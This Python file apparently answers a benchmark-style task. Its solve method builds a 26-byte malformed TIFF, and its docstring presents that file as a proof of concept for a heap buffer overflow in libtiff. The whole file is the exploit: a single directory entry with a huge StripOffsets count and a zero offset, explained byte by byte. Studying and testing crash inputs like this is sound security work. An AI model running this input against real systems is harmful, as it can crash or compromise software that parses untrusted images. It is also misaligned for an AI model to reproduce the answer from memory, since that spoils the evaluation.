import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept for a heap buffer overflow in libtiff.

        The vulnerability is triggered by a malformed TIFF file that contains
        an "offline" tag with a value/offset field of zero. An offline tag is
        one where the data it describes is too large to be stored inline in
        the 4-byte value/offset field. Instead, this field should contain an
        offset to the data's location within the file.

        By setting this offset to zero and providing a large data count, we
        trick the library into attempting a massive read from an invalid
        location at the beginning of its buffer, causing a heap buffer
        overflow.

        The PoC is a minimal TIFF file consisting of:
        1. A standard 8-byte TIFF header.
        2. A single Image File Directory (IFD).
        3. The IFD contains one malicious directory entry (tag).
        """

        # TIFF Header (8 bytes):
        # 'II' for Little Endian byte order.
        # 0x002a (42) is the standard version number.
        # 0x00000008 is the offset to the first (and only) IFD, which
        # immediately follows the header.
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # IFD Entry Count (2 bytes):
        # We specify that our IFD contains exactly one entry.
        num_entries = struct.pack('<H', 1)

        # Malicious Directory Entry (12 bytes):
        # We craft a single tag that triggers the vulnerability.
        # Format: <H (Tag ID), <H (Data Type), <L (Count), <L (Value/Offset)
        # - Tag ID: 273 (StripOffsets), a common tag that expects offline data.
        # - Data Type: 4 (LONG), representing a 4-byte integer.
        # - Count: 0xFFFFFFFF, a very large number. The total data size
        #   (count * sizeof(type)) will be huge, forcing it to be offline.
        # - Value/Offset: 0, the invalid offset that triggers the bug.
        malicious_entry = struct.pack('<HHLL', 273, 4, 0xFFFFFFFF, 0)

        # Next IFD Offset (4 bytes):
        # A value of 0 indicates that this is the last IFD in the file.
        next_ifd_offset = struct.pack('<L', 0)

        # Assemble the final PoC byte string.
        # Total length = 8 (header) + 2 (count) + 12 (entry) + 4 (next_offset) = 26 bytes.
        poc = header + num_entries + malicious_entry + next_ifd_offset
        
        return poc